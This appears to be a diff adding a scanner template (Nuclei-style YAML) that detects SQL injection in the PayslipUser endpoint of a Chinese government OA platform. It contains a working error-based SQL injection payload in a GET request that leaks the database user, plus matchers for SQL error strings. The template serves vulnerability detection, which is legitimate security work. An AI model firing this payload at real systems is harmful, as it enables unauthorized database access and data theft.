@@ -1,0 +1,27 @@
+id: poc-yaml-szt-smart-government-payslipuser-sqli
+info:
+  name: 数字通云平台智慧政务OA PayslipUser SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    数字通云平台智慧政务OA PayslipUser endpoint is vulnerable to SQL Injection, which can lead to unauthorized data exposure or manipulation.
+
+http:
+  - raw:
+      - |
+        GET /payslip/search/index/userid/time/time?PayslipUser[user_id]=(SELECT%204050%20FROM(SELECT%20COUNT(*),CONCAT((mid((ifnull(cast(current_user()%20as%20nchar),0x20)),1,54)),FLOOR(RAND(0)*2))x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x)a) HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "SQLSTATE"
+          - "group_key"
+          - "无法执行 SQL 语句"
+        part: body
+
+      - type: status
+        status:
+          - 200
